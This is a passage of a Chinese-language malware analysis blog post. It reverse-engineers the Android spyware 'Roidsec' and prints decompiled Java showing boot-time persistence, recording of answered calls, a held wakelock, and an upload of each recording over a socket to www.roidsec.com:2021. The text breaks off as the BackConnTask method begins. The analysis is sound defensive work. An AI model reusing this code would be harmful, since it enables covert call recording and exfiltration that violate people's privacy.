<!DOCTYPE html>
<html>
<head>
<title>对恶意APPRoidsec的逆向分析</title>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<style type="text/css">
/* GitHub stylesheet for MarkdownPad (http://markdownpad.com) */
/* Author: Nicolas Hery - http://nicolashery.com */
/* Version: b13fe65ca28d2e568c6ed5d7f06581183df8f2ff */
/* Source: https://github.com/nicolahery/markdownpad-github */

/* RESET
=============================================================================*/

html, body, div, span, applet, object, iframe, h1, h2, h3, h4, h5, h6, p, blockquote, pre, a, abbr, acronym, address, big, cite, code, del, dfn, em, img, ins, kbd, q, s, samp, small, strike, strong, sub, sup, tt, var, b, u, i, center, dl, dt, dd, ol, ul, li, fieldset, form, label, legend, table, caption, tbody, tfoot, thead, tr, th, td, article, aside, canvas, details, embed, figure, figcaption, footer, header, hgroup, menu, nav, output, ruby, section, summary, time, mark, audio, video {
  margin: 0;
  padding: 0;
  border: 0;
}

/* BODY
=============================================================================*/

body {
  font-family: Helvetica, arial, freesans, clean, sans-serif;
  font-size: 14px;
  line-height: 1.6;
  color: #333;
  background-color: #fff;
  padding: 20px;
  max-width: 960px;
  margin: 0 auto;
}

body>*:first-child {
  margin-top: 0 !important;
}

body>*:last-child {
  margin-bottom: 0 !important;
}

/* BLOCKS
=============================================================================*/

p, blockquote, ul, ol, dl, table, pre {
  margin: 15px 0;
}

/* HEADERS
=============================================================================*/

h1, h2, h3, h4, h5, h6 {
  margin: 20px 0 10px;
  padding: 0;
  font-weight: bold;
  -webkit-font-smoothing: antialiased;
}

h1 tt, h1 code, h2 tt, h2 code, h3 tt, h3 code, h4 tt, h4 code, h5 tt, h5 code, h6 tt, h6 code {
  font-size: inherit;
}

h1 {
  font-size: 28px;
  color: #000;
}

h2 {
  font-size: 24px;
  border-bottom: 1px solid #ccc;
  color: #000;
}

h3 {
  font-size: 18px;
}

h4 {
  font-size: 16px;
}

h5 {
  font-size: 14px;
}

h6 {
  color: #777;
  font-size: 14px;
}

body>h2:first-child, body>h1:first-child, body>h1:first-child+h2, body>h3:first-child, body>h4:first-child, body>h5:first-child, body>h6:first-child {
  margin-top: 0;
  padding-top: 0;
}

a:first-child h1, a:first-child h2, a:first-child h3, a:first-child h4, a:first-child h5, a:first-child h6 {
  margin-top: 0;
  padding-top: 0;
}

h1+p, h2+p, h3+p, h4+p, h5+p, h6+p {
  margin-top: 10px;
}

/* LINKS
=============================================================================*/

a {
  color: #4183C4;
  text-decoration: none;
}

a:hover {
  text-decoration: underline;
}

/* LISTS
=============================================================================*/

ul, ol {
  padding-left: 30px;
}

ul li > :first-child, 
ol li > :first-child, 
ul li ul:first-of-type, 
ol li ol:first-of-type, 
ul li ol:first-of-type, 
ol li ul:first-of-type {
  margin-top: 0px;
}

ul ul, ul ol, ol ol, ol ul {
  margin-bottom: 0;
}

dl {
  padding: 0;
}

dl dt {
  font-size: 14px;
  font-weight: bold;
  font-style: italic;
  padding: 0;
  margin: 15px 0 5px;
}

dl dt:first-child {
  padding: 0;
}

dl dt>:first-child {
  margin-top: 0px;
}

dl dt>:last-child {
  margin-bottom: 0px;
}

dl dd {
  margin: 0 0 15px;
  padding: 0 15px;
}

dl dd>:first-child {
  margin-top: 0px;
}

dl dd>:last-child {
  margin-bottom: 0px;
}

/* CODE
=============================================================================*/

pre, code, tt {
  font-size: 12px;
  font-family: Consolas, "Liberation Mono", Courier, monospace;
}

code, tt {
  margin: 0 0px;
  padding: 0px 0px;
  white-space: nowrap;
  border: 1px solid #eaeaea;
  background-color: #f8f8f8;
  border-radius: 3px;
}

pre>code {
  margin: 0;
  padding: 0;
  white-space: pre;
  border: none;
  background: transparent;
}

pre {
  background-color: #f8f8f8;
  border: 1px solid #ccc;
  font-size: 13px;
  line-height: 19px;
  overflow: auto;
  padding: 6px 10px;
  border-radius: 3px;
}

pre code, pre tt {
  background-color: transparent;
  border: none;
}

kbd {
    -moz-border-bottom-colors: none;
    -moz-border-left-colors: none;
    -moz-border-right-colors: none;
    -moz-border-top-colors: none;
    background-color: #DDDDDD;
    background-image: linear-gradient(#F1F1F1, #DDDDDD);
    background-repeat: repeat-x;
    border-color: #DDDDDD #CCCCCC #CCCCCC #DDDDDD;
    border-image: none;
    border-radius: 2px 2px 2px 2px;
    border-style: solid;
    border-width: 1px;
    font-family: "Helvetica Neue",Helvetica,Arial,sans-serif;
    line-height: 10px;
    padding: 1px 4px;
}

/* QUOTES
=============================================================================*/

blockquote {
  border-left: 4px solid #DDD;
  padding: 0 15px;
  color: #777;
}

blockquote>:first-child {
  margin-top: 0px;
}

blockquote>:last-child {
  margin-bottom: 0px;
}

/* HORIZONTAL RULES
=============================================================================*/

hr {
  clear: both;
  margin: 15px 0;
  height: 0px;
  overflow: hidden;
  border: none;
  background: transparent;
  border-bottom: 4px solid #ddd;
  padding: 0;
}

/* TABLES
=============================================================================*/

table th {
  font-weight: bold;
}

table th, table td {
  border: 1px solid #ccc;
  padding: 6px 13px;
}

table tr {
  border-top: 1px solid #ccc;
  background-color: #fff;
}

table tr:nth-child(2n) {
  background-color: #f8f8f8;
}

/* IMAGES
=============================================================================*/

img {
  max-width: 100%
}
</style>
<style type="text/css">
.highlight  { background: #ffffff; }
.highlight .c { color: #999988; font-style: italic } /* Comment */
.highlight .err { color: #a61717; background-color: #e3d2d2 } /* Error */
.highlight .k { font-weight: bold } /* Keyword */
.highlight .o { font-weight: bold } /* Operator */
.highlight .cm { color: #999988; font-style: italic } /* Comment.Multiline */
.highlight .cp { color: #999999; font-weight: bold } /* Comment.Preproc */
.highlight .c1 { color: #999988; font-style: italic } /* Comment.Single */
.highlight .cs { color: #999999; font-weight: bold; font-style: italic } /* Comment.Special */
.highlight .gd { color: #000000; background-color: #ffdddd } /* Generic.Deleted */
.highlight .gd .x { color: #000000; background-color: #ffaaaa } /* Generic.Deleted.Specific */
.highlight .ge { font-style: italic } /* Generic.Emph */
.highlight .gr { color: #aa0000 } /* Generic.Error */
.highlight .gh { color: #999999 } /* Generic.Heading */
.highlight .gi { color: #000000; background-color: #ddffdd } /* Generic.Inserted */
.highlight .gi .x { color: #000000; background-color: #aaffaa } /* Generic.Inserted.Specific */
.highlight .go { color: #888888 } /* Generic.Output */
.highlight .gp { color: #555555 } /* Generic.Prompt */
.highlight .gs { font-weight: bold } /* Generic.Strong */
.highlight .gu { color: #aaaaaa } /* Generic.Subheading */
.highlight .gt { color: #aa0000 } /* Generic.Traceback */
.highlight .kc { font-weight: bold } /* Keyword.Constant */
.highlight .kd { font-weight: bold } /* Keyword.Declaration */
.highlight .kp { font-weight: bold } /* Keyword.Pseudo */
.highlight .kr { font-weight: bold } /* Keyword.Reserved */
.highlight .kt { color: #445588; font-weight: bold } /* Keyword.Type */
.highlight .m { color: #009999 } /* Literal.Number */
.highlight .s { color: #d14 } /* Literal.String */
.highlight .na { color: #008080 } /* Name.Attribute */
.highlight .nb { color: #0086B3 } /* Name.Builtin */
.highlight .nc { color: #445588; font-weight: bold } /* Name.Class */
.highlight .no { color: #008080 } /* Name.Constant */
.highlight .ni { color: #800080 } /* Name.Entity */
.highlight .ne { color: #990000; font-weight: bold } /* Name.Exception */
.highlight .nf { color: #990000; font-weight: bold } /* Name.Function */
.highlight .nn { color: #555555 } /* Name.Namespace */
.highlight .nt { color: #000080 } /* Name.Tag */
.highlight .nv { color: #008080 } /* Name.Variable */
.highlight .ow { font-weight: bold } /* Operator.Word */
.highlight .w { color: #bbbbbb } /* Text.Whitespace */
.highlight .mf { color: #009999 } /* Literal.Number.Float */
.highlight .mh { color: #009999 } /* Literal.Number.Hex */
.highlight .mi { color: #009999 } /* Literal.Number.Integer */
.highlight .mo { color: #009999 } /* Literal.Number.Oct */
.highlight .sb { color: #d14 } /* Literal.String.Backtick */
.highlight .sc { color: #d14 } /* Literal.String.Char */
.highlight .sd { color: #d14 } /* Literal.String.Doc */
.highlight .s2 { color: #d14 } /* Literal.String.Double */
.highlight .se { color: #d14 } /* Literal.String.Escape */
.highlight .sh { color: #d14 } /* Literal.String.Heredoc */
.highlight .si { color: #d14 } /* Literal.String.Interpol */
.highlight .sx { color: #d14 } /* Literal.String.Other */
.highlight .sr { color: #009926 } /* Literal.String.Regex */
.highlight .s1 { color: #d14 } /* Literal.String.Single */
.highlight .ss { color: #990073 } /* Literal.String.Symbol */
.highlight .bp { color: #999999 } /* Name.Builtin.Pseudo */
.highlight .vc { color: #008080 } /* Name.Variable.Class */
.highlight .vg { color: #008080 } /* Name.Variable.Global */
.highlight .vi { color: #008080 } /* Name.Variable.Instance */
.highlight .il { color: #009999 } /* Literal.Number.Integer.Long */
.pl-c {
    color: #969896;
}

.pl-c1,.pl-mdh,.pl-mm,.pl-mp,.pl-mr,.pl-s1 .pl-v,.pl-s3,.pl-sc,.pl-sv {
    color: #0086b3;
}

.pl-e,.pl-en {
    color: #795da3;
}

.pl-s1 .pl-s2,.pl-smi,.pl-smp,.pl-stj,.pl-vo,.pl-vpf {
    color: #333;
}

.pl-ent {
    color: #63a35c;
}

.pl-k,.pl-s,.pl-st {
    color: #a71d5d;
}

.pl-pds,.pl-s1,.pl-s1 .pl-pse .pl-s2,.pl-sr,.pl-sr .pl-cce,.pl-sr .pl-sra,.pl-sr .pl-sre,.pl-src,.pl-v {
    color: #df5000;
}

.pl-id {
    color: #b52a1d;
}

.pl-ii {
    background-color: #b52a1d;
    color: #f8f8f8;
}

.pl-sr .pl-cce {
    color: #63a35c;
    font-weight: bold;
}

.pl-ml {
    color: #693a17;
}

.pl-mh,.pl-mh .pl-en,.pl-ms {
    color: #1d3e81;
    font-weight: bold;
}

.pl-mq {
    color: #008080;
}

.pl-mi {
    color: #333;
    font-style: italic;
}

.pl-mb {
    color: #333;
    font-weight: bold;
}

.pl-md,.pl-mdhf {
    background-color: #ffecec;
    color: #bd2c00;
}

.pl-mdht,.pl-mi1 {
    background-color: #eaffea;
    color: #55a532;
}

.pl-mdr {
    color: #795da3;
    font-weight: bold;
}

.pl-mo {
    color: #1d3e81;
}
.task-list {
padding-left:10px;
margin-bottom:0;
}

.task-list li {
    margin-left: 20px;
}

.task-list-item {
list-style-type:none;
padding-left:10px;
}

.task-list-item label {
font-weight:400;
}

.task-list-item.enabled label {
cursor:pointer;
}

.task-list-item+.task-list-item {
margin-top:3px;
}

.task-list-item-checkbox {
display:inline-block;
margin-left:-20px;
margin-right:3px;
vertical-align:1px;
}
</style>
</head>
<body>
<h1 id="-approidsec-">对恶意APPRoidsec的逆向分析</h1>
<p><strong>Author:wnagzihxa1n<br>E-Mail:wnagzihxa1n@gmail.com</strong></p>
<p>在这个美好的日子总要做点什么庆祝一下，那就分析个App吧</p>
<p>报告名称：对恶意APPRoidsec的逆向分析<br>作者：wnagzihxain<br>报告更新日期：2016.6.1<br>样本发现日期：不详<br>样本类型：<br>样本文件大小／被感染文件变化长度：<br>样本文件MD5 校验值：<br>样本文件SHA1 校验值：<br>壳信息：无<br>可能受到威胁的系统：安卓<br>相关漏洞：无<br>已知检测名称：无</p>
<p>看到了一篇关于安卓开发相关的文章，想起手头刚好有个利用这种技术的恶意APP样本，那么就来分析一下吧</p>
<p>上apktool</p>
<pre><code>apktool d -f Roidsec_D4A557EC086E52C443BDE1B8ACE51739.apk -o do
</code></pre><p><img src="Image/1.png" alt=""></p>
<p>然后随便翻翻，并没有什么重要的图片~~~</p>
<p>上JEB看Manifest.xml</p>
<p><img src="Image/2.png" alt=""></p>
<p>发现只有一个service和Receiver</p>
<pre><code>&lt;intent-filter android:priority=&quot;2147483647&quot;&gt;
    &lt;action android:name=&quot;android.intent.action.BOOT_COMPLETED&quot; /&gt;
&lt;/intent-filter&gt;
</code></pre><p>这东西出现很大可能就是开机启动</p>
<p>果然是开机启动一个<code>Service：PhoneSyncService</code></p>
<p><img src="Image/3.png" alt=""></p>
<p>找来找去没有看到Activity。。。。。。</p>
<p>没有就没有吧，继续把准备工作干完</p>
<p>今天来介绍一个类似dex2jar的工具：<code>enjarify</code></p>
<p>谷歌的介绍是这样的</p>
<p>简单翻译一下大概就是说：dex2jar在普通的逆向工作中表现的还是不错的，但是在日新月异的逆向调试中，有很多情况会导致dex2jar出问题，所以设计了enjarify，可以适应各种奢华场景。。。。。。</p>
<p>先夸奖一下然后烘托自家产品厉害，都是套路</p>
<p><img src="Image/4.png" alt=""></p>
<p>那这次就用用enjarify吧</p>
<p>跟着前面的脚步，启动一个PhoneSyncService，那么就来看看这个Service的代码吧</p>
<p><img src="Image/5.png" alt=""></p>
<p>略微有点多，这里我都缩略了一下，并不能完整的显示所有的方法，作者这代码写的不好哇，这么多方法放一个类，差评</p>
<p>看这四个</p>
<p><img src="Image/6.png" alt=""></p>
<p>这是Service关键的几个方法</p>
<p>本来想演示无activity启动来说明这几个方法的运行顺序和生命周期的，但是结果在下载镜像的时候被天朝的GFW坑了</p>
<p>说结论：3.1以前的安卓系统，可以无activity运行应用，但是3.1开始因为安全的考虑，不能无activity运行，不过可以绕过去</p>
<p>先运行有activity的版本，然后删除activity和xml配置再重新安装，运行一次后就可以绕过去了</p>
<p>关于生命周期：当收到开机广播的时候，会先执行<code>onCreate()</code>方法，然后执行<code>onStartCommand()</code>方法，接着<code>onStartCommand()</code>方法可能会多次执行到</p>
<p>但是<code>onCreate()</code>只会执行一次，以后就不会再执行了，<code>onDestroy()</code>方法都是比较常规的就不用说了</p>
<p>工具要结合着用嘛，小书包里掏出JEB</p>
<p>找到刚才那几个方法，先来看<code>onCreate()</code></p>
<pre><code>public void onCreate() {
    this.registerReceiver(this.broadcastreceiver, new IntentFilter(&quot;sms.send&quot;));  // 动态注册一个Receiver
    Log.i(&quot;PhoneIMEService&quot;, &quot;service created&quot;);
    super.onCreate();
}
&lt;/pre&gt;

动态注册了一个Receiver，跟上这个broadcastreceiver看看是什么

&lt;pre class=&quot;lang:java decode:true &quot;&gt;private BroadcastReceiver broadcastreceiver;&lt;/pre&gt;
Soga，用于广播接收，action是”sms.send”

既然是对象必然要new，上下翻一翻，在这

&lt;pre class=&quot;lang:java decode:true &quot;&gt;public PhoneSyncService() {
    super();
    this.Sendresult = null;
    this.broadcastreceiver = new BroadcastReceiver() {
        public void onReceive(Context context, Intent intent) {
            switch(this.getResultCode()) {
                case -1: {
                    PhoneSyncService.this.Sendresult = &quot;成功!&quot;;
                    break;
                }
                case 1: {
                    PhoneSyncService.this.Sendresult = &quot;失败[result_error_generic_failure!]&quot;;
                    break;
                }
                case 3: {
                    PhoneSyncService.this.Sendresult = &quot;失败[result_error_null_pdu!]&quot;;
                    break;
                }
                case 4: {
                    PhoneSyncService.this.Sendresult = &quot;失败[result_error_no_service!]&quot;;
                    break;
                }
            }
        }
    };
}
</code></pre><p>从整个函数来看是<code>PhoneSyncService</code>的构造方法里实现的</p>
<p>作用是用于获取广播<code>sms.send</code>的<code>ResultCode</code></p>
<p><code>onCreate()</code>方法执行完就会执行<code>onStartCommand()</code></p>
<pre><code>public int onStartCommand(Intent intent, int flags, int startId) {
    this.getSystemService(&quot;phone&quot;).listen(new TelListener(this, null), 32);
    this.acquireWakeLock();
    Handler handler = new Handler();
    handler.postDelayed(new Runnable() {
        public void run() {
            PhoneSyncService.this.BackConnTask();
            this.val$handler.postDelayed(((Runnable)this), 2000);
        }
    }, 2000);
    return 1;
}
</code></pre><p>读代码的时候到了</p>
<p>这句不考虑语法平台之类的话，意思是注册一个监听器监听电话（打电话：来电去电）</p>
<pre><code>this.getSystemService(&quot;phone&quot;).listen(new TelListener(this, null), 32);
</code></pre><p>参数32参考下面这个定义，如果这个状态改变则触发相应的方法</p>
<pre><code>public static final int LISTEN_NONE = 0; //停止监听 
public static final int LISTEN_SERVICE_STATE = 0x00000001;
public static final int LISTEN_MESSAGE_WAITING_INDICATOR = 0x00000004;
public static final int LISTEN_CALL_FORWARDING_INDICATOR = 0x00000008;
public static final int LISTEN_CELL_LOCATION = 0x00000010;
public static final int LISTEN_CALL_STATE = 0x00000020;
public static final int LISTEN_DATA_CONNECTION_STATE = 0x00000040;
public static final int LISTEN_DATA_ACTIVITY = 0x00000080;
public static final int LISTEN_SIGNAL_STRENGTHS = 0x00000100;
public static final int LISTEN_NONE = 0; //停止监听
public static final int LISTEN_SERVICE_STATE = 0x00000001;
public static final int LISTEN_MESSAGE_WAITING_INDICATOR = 0x00000004;
public static final int LISTEN_CALL_FORWARDING_INDICATOR = 0x00000008;
public static final int LISTEN_CELL_LOCATION = 0x00000010;
public static final int LISTEN_CALL_STATE = 0x00000020;
public static final int LISTEN_DATA_CONNECTION_STATE = 0x00000040;
public static final int LISTEN_DATA_ACTIVITY = 0x00000080;
public static final int LISTEN_SIGNAL_STRENGTHS = 0x00000100;
</code></pre><p>继续看listen里面的参数</p>
<p>New了一个<code>TelListener</code>对象，定义如下</p>
<pre><code>class TelListener extends PhoneStateListener {
    final class UploadTask implements Runnable {
        UploadTask(TelListener arg1, UploadTask arg2) {
            super(arg1);
        }
        private UploadTask(TelListener arg1) {
            this.this$1 = arg1;
            super();
        }
        public void run() {
            try {
                Socket socket = new Socket(InetAddress.getByName(&quot;www.roidsec.com&quot;), 2021);
                OutputStream outputstream = socket.getOutputStream();
                outputstream.write(&quot;Content-Length=&quot; + this.this$1.audioFile.length() + &quot;;filename=&quot; + this.this$1.audioFile.getName() + &quot;;sourceid=\r\n&quot;.getBytes());
                PushbackInputStream pushbackinputstream = new PushbackInputStream(socket.getInputStream());
                String[] v5 = StreamTool.readLine(pushbackinputstream).split(&quot;;&quot;);
                String v8 = v5[1].substring(v5[1].indexOf(&quot;=&quot;) + 1);
                RandomAccessFile randomaccessfile = new RandomAccessFile(this.this$1.audioFile, &quot;r&quot;);
                randomaccessfile.seek(((long)Integer.valueOf(v8).intValue()));
                byte[] v0 = new byte[1024];
                while(true) {
                    int v6 = randomaccessfile.read(v0);
                    if(v6 == -1) {
                        break;
                    }
                    outputstream.write(v0, 0, v6);
                }
                randomaccessfile.close();
                outputstream.close();
                pushbackinputstream.close();
                socket.close();
                this.this$1.audioFile.delete();
                return;
            }
            catch(Exception error){
                Log.e(&quot;PhoneIMEService&quot;, error.toString());
                return;
            }
        }
    }
    private File audioFile;
    private String mobile;
    private boolean record;
    private MediaRecorder recorder;
    TelListener(PhoneSyncService arg1, TelListener arg2) {
        super(arg1);
    }
    private TelListener(PhoneSyncService arg1) {
        PhoneSyncService.this = arg1;
        super();
    }
    static File access$0(TelListener arg1) {
        return arg1.audioFile;
    }
    public void onCallStateChanged(int state, String incomingNumber) {
        switch(state) {
            case 0: {
                goto label_3;
            }
            case 1: {
                goto label_73;
            }
            case 2: {
                goto label_26;
            }
        }
        goto label_1;
        try {
            label_3:
                if(!this.record) {
                    goto label_1;
                }
                this.recorder.stop();
                this.recorder.release();
                this.record = false;
                new Thread(new UploadTask(this, null)).start();
                Log.i(&quot;PhoneIMEService&quot;, &quot;start upload file&quot;);
                goto label_1;
            label_73:
                Log.i(&quot;PhoneIMEService&quot;, &quot;incomingNumber:&quot; + incomingNumber);
                this.mobile = incomingNumber;
                goto label_1;
            label_26:
                Log.i(&quot;PhoneIMEService&quot;, &quot;OFFHOOK:&quot; + this.mobile);
                this.recorder = new MediaRecorder();
                this.recorder.setAudioSource(4);
                this.recorder.setOutputFormat(1);
                this.recorder.setAudioEncoder(1);
                this.audioFile = new File(PhoneSyncService.this.getCacheDir(), String.valueOf(this.mobile) + &quot;_&quot; + System.currentTimeMillis() + &quot;.3gp&quot;);
                this.recorder.setOutputFile(this.audioFile.getAbsolutePath());
                this.recorder.prepare();
                this.recorder.start();
                this.record = true;
        }
        catch(Exception error) {
            Log.e(&quot;PhoneIMEService&quot;, error.toString());
        }
        label_1:
            super.onCallStateChanged(state, incomingNumber);
    }
}
</code></pre><p>这个监听器写的代码有点多，来仔细读读代码</p>
<p>一个<code>UploadTask</code>类，使用Runnable接口，那看来接下来是要开线程了</p>
<p><img src="Image/7.png" alt=""></p>
<p>先不管，来看看最重要的onCallStateChanged()，状态改变就会调用这个方法</p>
<pre><code>public void onCallStateChanged(int state, String incomingNumber) {
    switch(state) {
        case 0: {
            goto label_3;
        }
        case 1: {
            goto label_73;
        }
        case 2: {
            goto label_26;
        }
    }
    goto label_1;
    try {
        label_3:
            if(!this.record) {
                goto label_1;
            }
            this.recorder.stop();
            this.recorder.release();
            this.record = false;
            new Thread(new UploadTask(this, null)).start();
            Log.i(&quot;PhoneIMEService&quot;, &quot;start upload file&quot;);
            goto label_1;
        label_73:
            Log.i(&quot;PhoneIMEService&quot;, &quot;incomingNumber:&quot; + incomingNumber);
            this.mobile = incomingNumber;
            goto label_1;
        label_26:
            Log.i(&quot;PhoneIMEService&quot;, &quot;OFFHOOK:&quot; + this.mobile);
            this.recorder = new MediaRecorder();
            this.recorder.setAudioSource(4);
            this.recorder.setOutputFormat(1);
            this.recorder.setAudioEncoder(1);
            this.audioFile = new File(PhoneSyncService.this.getCacheDir(), String.valueOf(this.mobile) + &quot;_&quot; + System.currentTimeMillis() + &quot;.3gp&quot;);
            this.recorder.setOutputFile(this.audioFile.getAbsolutePath());
            this.recorder.prepare();
            this.recorder.start();
            this.record = true;
    }
    catch(Exception error) {
        Log.e(&quot;PhoneIMEService&quot;, error.toString());
    }
    label_1:
        super.onCallStateChanged(state, incomingNumber);
}
</code></pre><p>依旧是读代码</p>
<p>根据传进来的状态码跳到相应的label</p>
<pre><code>switch(state) {
    case 0: {
        goto label_3;
    }
    case 1: {
        goto label_73;
    }
    case 2: {
        goto label_26;
    }
}
goto label_1;
</code></pre><p>关于几种状态码看这里</p>
<pre><code>CALL_STATE_IDLE=0      无活动
CALL_STATE_RINGING=1  响铃
CALL_STATE_OFFHOOK=2 摘机
</code></pre><p>case 0为无活动，跳到label_3</p>
<pre><code>label_3:
    if(!this.record){
        goto label_1;
    }
    this.recorder.stop();
    this.recorder.release();
    this.record = false;
    new Thread(new UploadTask(this, null)).start();
    Log.i(&quot;PhoneIMEService&quot;, &quot;start upload file&quot;);
    goto label_1;
</code></pre><p>这里判断了record，查一下定义</p>
<pre><code>private boolean record;
</code></pre><p>没有初始值而且是类一级的变量，默认是false</p>
<p>写了个demo演示</p>
<p><img src="Image/8.png" alt=""></p>
<p>所以上面的代码就会执行if里面的语句，也就是跳到label_1</p>
<pre><code>label_1:
    super.onCallStateChanged(state, incomingNumber);
</code></pre><p><code>case 0</code>剩下的代码先不管，来看<code>case 1</code>，这是有来电等待接听，跳到label_73</p>
<pre><code>label_73:
    Log.i(&quot;PhoneIMEService&quot;, &quot;incomingNumber:&quot; + incomingNumber);
    this.mobile = incomingNumber;
    goto label_1;
</code></pre><p><code>incomingNumber为onCallStateChanged()</code>方法的参数，代表打过来电话的手机号</p>
<p>存到这个类的全局变量mobile然后继续跳到label_1</p>
<p>看<code>case 2</code>，代表接听，跳到label_26</p>
<pre><code>label_26:
    Log.i(&quot;PhoneIMEService&quot;, &quot;OFFHOOK:&quot; + this.mobile);
    this.recorder = new MediaRecorder();
    this.recorder.setAudioSource(4);
    this.recorder.setOutputFormat(1);
    this.recorder.setAudioEncoder(1);
    this.audioFile = new File(PhoneSyncService.this.getCacheDir(), String.valueOf(this.mobile) + &quot;_&quot; + System.currentTimeMillis() + &quot;.3gp&quot;);
    this.recorder.setOutputFile(this.audioFile.getAbsolutePath());
    this.recorder.prepare();
    this.recorder.start();
    this.record = true;
</code></pre><p>这个就有意思了，慢慢读代码</p>
<p>new了一个<code>MediaRecorder</code>对象，这个变量其实前面是有定义的</p>
<pre><code>private MediaRecorder recorder;//定义在类全局变量
this.recorder = new MediaRecorder();
</code></pre><p>设置用于录制的音源</p>
<pre><code>this.recorder.setAudioSource(4);
</code></pre><p>设置在录制过程中产生的输出文件的格式</p>
<pre><code>this.recorder.setOutputFormat(1);
</code></pre><p>设置audio的编码格式</p>
<pre><code>this.recorder.setAudioEncoder(1);
</code></pre><p>创建录音文件，名字为<code>来电的手机号_时间.3gp</code></p>
<pre><code>private File audioFile; //定义在类全局变量
this.audioFile = new File(PhoneSyncService.this.getCacheDir(), String.valueOf(this.mobile) + &quot;_&quot; + System.currentTimeMillis() + &quot;.3gp&quot;);
</code></pre><p>将录制的音频保存到刚才的文件</p>
<pre><code>this.recorder.setOutputFile(this.audioFile.getAbsolutePath());
</code></pre><p>这两句和<code>MediaPlayer</code>类是一样的，先prepare，再start</p>
<pre><code>this.recorder.prepare();
this.recorder.start();
</code></pre><p>设置record为true，作用等会讲</p>
<pre><code>this.record = true;
</code></pre><p>然后电话打完后，就会变成<code>case 0</code>的情况</p>
<p>但是此时<code>case 0</code>的代码执行过程就不一样了</p>
<p>来看</p>
<pre><code>label_3:
    if(!this.record){
        goto label_1;
    }
    this.recorder.stop();
    this.recorder.release();
    this.record = false;
    new Thread(new UploadTask(this, null)).start();
    Log.i(&quot;PhoneIMEService&quot;, &quot;start upload file&quot;);
    goto label_1;
</code></pre><p>还记得刚才record设置为true了吗？</p>
<p>这个变量的作用就是记录刚刚是否打完电话，打完电话才有音频要存呀</p>
<p>record为true，那么if里的语句不会执行，来看执行的语句</p>
<p>刚才start，所以打完电话停止录制就要stop</p>
<pre><code>this.recorder.stop();
</code></pre><p>释放recorder对象</p>
<pre><code>this.recorder.release();
</code></pre><p>将record设置为false，这样才不会打完一次电话就反复执行这个label</p>
<pre><code>this.record = false;
</code></pre><p>重头戏在这里</p>
<pre><code>new Thread(new UploadTask(this, null)).start();
</code></pre><p>还记得最开始有一张代码的图片我说先放着吗？</p>
<p>完整代码在这</p>
<pre><code>final class UploadTask implements Runnable {
    UploadTask(TelListener arg1, UploadTask arg2) {
        super(arg1);
    }
    private UploadTask(TelListener arg1){
        this.this$1 = arg1;
        super();
    }
    public void run(){
        try{
            Socket socket = new Socket(InetAddress.getByName(&quot;www.roidsec.com&quot;), 2021);
            OutputStream outputstream = socket.getOutputStream();
            outputstream.write(&quot;Content-Length=&quot; + this.this$1.audioFile.length() + &quot;;filename=&quot; + this.this$1.audioFile.getName() + &quot;;sourceid=\r\n&quot;.getBytes());
            PushbackInputStream pushbackinputstream = new PushbackInputStream(socket.getInputStream());
            String[] v5 = StreamTool.readLine(pushbackinputstream).split(&quot;;&quot;);
            String v8 = v5[1].substring(v5[1].indexOf(&quot;=&quot;) + 1);
            RandomAccessFile randomaccessfile = new RandomAccessFile(this.this$1.audioFile, &quot;r&quot;);
            randomaccessfile.seek(((long)Integer.valueOf(v8).intValue()));
            byte[] v0 = new byte[1024];
            while(true) {
                int v6 = randomaccessfile.read(v0);
                if(v6 == -1) {
                    break;
                }
                outputstream.write(v0, 0, v6);
            }
            randomaccessfile.close();
            outputstream.close();
            pushbackinputstream.close();
            socket.close();
            this.this$1.audioFile.delete();
            return;
        }
        catch(Exception error){
            Log.e(&quot;PhoneIMEService&quot;, error.toString());
            return;
        }
    }
}
</code></pre><p>读代码读代码读代码</p>
<p>直接看<code>run()</code>方法就行了</p>
<p>连接服务器</p>
<pre><code>Socket socket = new Socket(InetAddress.getByName(&quot;www.roidsec.com&quot;), 2021);
</code></pre><p>给服务器发送刚才录制的音频的文件信息，此时没有传输音频</p>
<pre><code>OutputStream outputstream = socket.getOutputStream();
outputstream.write(&quot;Content-Length=&quot; + this.this$1.audioFile.length() + &quot;;filename=&quot; + this.this$1.audioFile.getName() + &quot;;sourceid=\r\n&quot;.getBytes());
PushbackInputStream pushbackinputstream = new
PushbackInputStream(socket.getInputStream());
String[] v5 = StreamTool.readLine(pushbackinputstream).split(&quot;;&quot;);
String v8 = v5[1].substring(v5[1].indexOf(&quot;=&quot;) + 1);
</code></pre><p>开始传输音频</p>
<pre><code>RandomAccessFile randomaccessfile = new RandomAccessFile(this.this$1.audioFile, &quot;r&quot;);
randomaccessfile.seek(((long)Integer.valueOf(v8).intValue()));
byte[] v0 = new byte[1024];
while(true) {
    int v6 = randomaccessfile.read(v0);
    if(v6 == -1) {
        break;
    }
    outputstream.write(v0, 0, v6);
}
</code></pre><p>把各种连接什么的都关掉</p>
<pre><code>randomaccessfile.close();
outputstream.close();
pushbackinputstream.close();
socket.close();
</code></pre><p>删掉刚才录制的音频文件</p>
<pre><code>this.this$1.audioFile.delete();
return;
</code></pre><p>以上就是触发监听器后的所有行为，总结一下：</p>
<p>当有来电，受害者接听的时候开启录音，受害者挂掉电话停止录制并把录制的音频传到服务器</p>
<p>还记得刚才代码读到哪了吗？<code>onStartCommand()</code>里注册了一个监听器</p>
<p>看这好像是要获得<code>wakelock锁</code></p>
<pre><code>this.acquireWakeLock();
</code></pre><p>跟过去</p>
<pre><code>private void acquireWakeLock() {
    if(this.mWakeLock == null) {
        this.mWakeLock = this.getSystemService(&quot;power&quot;).newWakeLock(536870913, &quot;PhoneIMEService&quot;);
        if(this.mWakeLock != null) {
            this.mWakeLock.acquire();
        }
    }
}
</code></pre><p>这句</p>
<pre><code>if(this.mWakeLock == null)
</code></pre><p>来看<code>mWakeLock</code>的定义</p>
<pre><code>PowerManager$WakeLock mWakeLock;
</code></pre><p>那这样一来很清楚了，如果这个定义的锁对象还是null就先配置一下信息，再判断不为空就申请锁，然后抱着锁不撒手就行了，想不撒手很简单，不调用release()就行</p>
<p>接着这里有延迟执行的任务</p>
<pre><code>Handler handler = new Handler();
handler.postDelayed(new Runnable() {
    public void run() {
        PhoneSyncService.this.BackConnTask();
        this.val$handler.postDelayed(((Runnable)this), 2000);
    }
}, 2000);
</code></pre><p>这个任务延迟两秒执行</p>
<pre><code>PhoneSyncService.this.BackConnTask();
</code></pre><p>跟过去，代码有点多，先看看就好</p>
<pre><code>private void BackConnTask() {
    byte[] v20;
    RandomAccessFile randomaccessfile;
    Object v33;
    int length;
    char[] arraychar;
    OutputStream outputstream;
    try {
